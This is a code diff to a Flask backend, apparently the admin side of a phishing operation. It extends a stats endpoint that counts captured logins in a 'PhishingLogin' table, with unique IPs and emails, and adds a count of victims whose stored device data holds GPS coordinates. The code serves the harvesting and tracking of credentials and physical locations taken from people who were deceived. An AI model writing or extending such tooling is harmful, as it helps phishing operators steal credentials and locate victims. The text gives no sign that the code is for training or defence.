@@ -4,6 +4,7 @@ from dotenv import load_dotenv
 import os
 from datetime import datetime
 import threading
+import json
 
 load_dotenv()
 
@@ -366,10 +367,23 @@ def stats():
         unique_ips = db.session.query(db.func.count(db.distinct(PhishingLogin.ip))).scalar()
         unique_emails = db.session.query(db.func.count(db.distinct(PhishingLogin.email))).scalar()
         
+        # Contar quantos têm geolocalização GPS
+        entries = PhishingLogin.query.all()
+        geo_count = 0
+        for entry in entries:
+            try:
+                d = json.loads(entry.device_info or '{}')
+                geo = d.get('geolocation', {})
+                if geo and geo.get('lat') and geo.get('lon'):
+                    geo_count += 1
+            except:
+                pass
+        
         return jsonify({
             'total_logins': total or 0,
             'unique_ips': unique_ips or 0,
-            'unique_emails': unique_emails or 0
+            'unique_emails': unique_emails or 0,
+            'geo_count': geo_count
         }), 200
     except Exception as e:
         return jsonify({'error': str(e)}), 500
